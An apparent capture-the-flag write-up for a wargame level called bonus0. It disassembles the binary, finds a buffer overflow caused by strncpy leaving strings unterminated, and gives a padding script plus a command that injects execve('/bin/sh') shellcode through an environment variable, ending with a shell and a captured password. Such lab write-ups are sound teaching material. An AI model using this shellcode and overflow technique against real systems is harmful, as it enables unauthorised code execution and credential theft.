# Bonus0

First step - testing the program
```
$ ./bonus0
 -
Hello
 -
World
Hello World
$ ./bonus0
 -
a
 -
b
a b
```
The program wait an input 2 times and print the result

Start in GDB
```
(gdb-peda)$ disas main
Dump of assembler code for function main:
   0x080485a4 <+0>:		push   ebp
   0x080485a5 <+1>:		mov    ebp,esp
   0x080485a7 <+3>:		and    esp,0xfffffff0
   0x080485aa <+6>:		sub    esp,0x40
   0x080485ad <+9>:		lea    eax,[esp+0x16]
   0x080485b1 <+13>:	mov    DWORD PTR [esp],eax
   0x080485b4 <+16>:	call   0x804851e <pp>
   0x080485b9 <+21>:	lea    eax,[esp+0x16]
   0x080485bd <+25>:	mov    DWORD PTR [esp],eax
   0x080485c0 <+28>:	call   0x80483b0 <puts@plt>
   0x080485c5 <+33>:	mov    eax,0x0
   0x080485ca <+38>:	leave
   0x080485cb <+39>:	ret
End of assembler dump.
```
The main call a function "pp"
```
(gdb-peda)$ disas pp
Dump of assembler code for function pp:
   0x0804851e <+0>:		push   ebp
   0x0804851f <+1>:		mov    ebp,esp
   0x08048521 <+3>:		push   edi
   0x08048522 <+4>:		push   ebx
   0x08048523 <+5>:		sub    esp,0x50
   0x08048526 <+8>:		mov    DWORD PTR [esp+0x4],0x80486a0
   0x0804852e <+16>:	lea    eax,[ebp-0x30]
   0x08048531 <+19>:	mov    DWORD PTR [esp],eax
   0x08048534 <+22>:	call   0x80484b4 <p>
   0x08048539 <+27>:	mov    DWORD PTR [esp+0x4],0x80486a0
   0x08048541 <+35>:	lea    eax,[ebp-0x1c]
   0x08048544 <+38>:	mov    DWORD PTR [esp],eax
   0x08048547 <+41>:	call   0x80484b4 <p>
   0x0804854c <+46>:	lea    eax,[ebp-0x30]
   0x0804854f <+49>:	mov    DWORD PTR [esp+0x4],eax
   0x08048553 <+53>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048556 <+56>:	mov    DWORD PTR [esp],eax
   0x08048559 <+59>:	call   0x80483a0 <strcpy@plt>
   0x0804855e <+64>:	mov    ebx,0x80486a4
   0x08048563 <+69>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048566 <+72>:	mov    DWORD PTR [ebp-0x3c],0xffffffff
   0x0804856d <+79>:	mov    edx,eax
   0x0804856f <+81>:	mov    eax,0x0
   0x08048574 <+86>:	mov    ecx,DWORD PTR [ebp-0x3c]
   0x08048577 <+89>:	mov    edi,edx
   0x08048579 <+91>:	repnz scas al,BYTE PTR es:[edi]
   0x0804857b <+93>:	mov    eax,ecx
   0x0804857d <+95>:	not    eax
   0x0804857f <+97>:	sub    eax,0x1
   0x08048582 <+100>:	add    eax,DWORD PTR [ebp+0x8]
   0x08048585 <+103>:	movzx  edx,WORD PTR [ebx]
   0x08048588 <+106>:	mov    WORD PTR [eax],dx
   0x0804858b <+109>:	lea    eax,[ebp-0x1c]
   0x0804858e <+112>:	mov    DWORD PTR [esp+0x4],eax
   0x08048592 <+116>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048595 <+119>:	mov    DWORD PTR [esp],eax
   0x08048598 <+122>:	call   0x8048390 <strcat@plt>
   0x0804859d <+127>:	add    esp,0x50
   0x080485a0 <+130>:	pop    ebx
   0x080485a1 <+131>:	pop    edi
   0x080485a2 <+132>:	pop    ebp
   0x080485a3 <+133>:	ret
End of assembler dump.
```
The function "pp" call a function "p". And strcpy, we can overflow
```
(gdb-peda)$ disas p
Dump of assembler code for function p:
   0x080484b4 <+0>:		push   ebp
   0x080484b5 <+1>:		mov    ebp,esp
   0x080484b7 <+3>:		sub    esp,0x1018
   0x080484bd <+9>:		mov    eax,DWORD PTR [ebp+0xc]
   0x080484c0 <+12>:	mov    DWORD PTR [esp],eax
   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:	mov    DWORD PTR [esp+0x8],0x1000
   0x080484d0 <+28>:	lea    eax,[ebp-0x1008]
   0x080484d6 <+34>:	mov    DWORD PTR [esp+0x4],eax
   0x080484da <+38>:	mov    DWORD PTR [esp],0x0
   0x080484e1 <+45>:	call   0x8048380 <read@plt>
   0x080484e6 <+50>:	mov    DWORD PTR [esp+0x4],0xa
   0x080484ee <+58>:	lea    eax,[ebp-0x1008]
   0x080484f4 <+64>:	mov    DWORD PTR [esp],eax
   0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
   0x080484fc <+72>:	mov    BYTE PTR [eax],0x0
   0x080484ff <+75>:	lea    eax,[ebp-0x1008]
   0x08048505 <+81>:	mov    DWORD PTR [esp+0x8],0x14
   0x0804850d <+89>:	mov    DWORD PTR [esp+0x4],eax
   0x08048511 <+93>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048514 <+96>:	mov    DWORD PTR [esp],eax
   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
   0x0804851c <+104>:	leave
   0x0804851d <+105>:	ret
End of assembler dump.
```

---

Ok, so we have 1 buffer[54] in the main, will be fill with 2 buffer in `PP`, each 20bytes size, and they will be filled with buffer[1104] in `p` function.

The strncp function is the cause of exploit, be cause it can be copy without null terminated string and we can use it for fill main buffer with buffer_PP1 + buffer_PP2 + BUFFER_PP2 and exceed the size of main buffer.

Like usualy we find offset with gdp-peda and environment address for our shellcode. 
We can write script for create pad : 


```
#!/usr/bin/python

import struct

BUFF_PP1 = struct.pack("I",0xbffff6b8)
BUFF_PP2 = struct.pack("I",0xbffff6cc)

ENV = struct.pack("I", 0xbfffff8d)

PAD = ""
PAD += "A" * 4095
PAD += "\n"
PAD += "B" * 9
PAD += ENV
PAD += "C" * 7

print  PAD
```

And we can run our exploit :


```
$ ./exploit.py > payload
$ cat payload - | env -i payload=`python -c 'print("\x90"*50+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")'` $PWD/bonus0
 -
 -
AAAAAAAAAAAAAAAAAAAABBBBBBBBB����CCCCCCC��� BBBBBBBBB����CCCCCCC���

$whoami
bonus1

$cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
